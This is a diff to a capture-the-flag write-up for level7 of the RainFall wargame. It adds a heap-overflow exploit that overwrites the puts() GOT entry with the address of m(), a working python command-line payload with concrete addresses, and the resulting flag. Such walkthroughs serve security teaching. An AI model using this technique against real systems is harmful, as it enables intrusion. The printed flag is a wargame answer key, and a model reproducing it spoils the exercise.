@@ -2,7 +2,7 @@
 
 ## Vulnerability
 
-Memory Corruption
+Heap Overflow + Memory Corruption
 
 ## Context
 
@@ -102,6 +102,22 @@ strcpy(0x37614136, NULL <unfinished ...>
 --- SIGSEGV (Segmentation fault) ---
 +++ killed by SIGSEGV +++
 ```
-It looks like the program segfaults at 0x37614136, and if we plug that into our [handy link](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/), we find the offset is 20. 
+It looks like the program segfaults at 0x37614136, and if we plug that into our handy link above, we find the offset is 20. 
+
+Here is what our string attack should look like:
+- pad of arbitrary data [20 bytes]
+- puts() GOT address [4 bytes]
+- address of m() [4 bytes]
+Let's visualize that. 
+```
+"paddings [20 bytes] + puts GOT address" + "m() address"
+               argv[1]                       argv[2]
+```
+Let's try it out!
+```
+level7@RainFall:~$ ./level7 $(python -c 'print "a"*20+"\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1611061949
+```
 
 
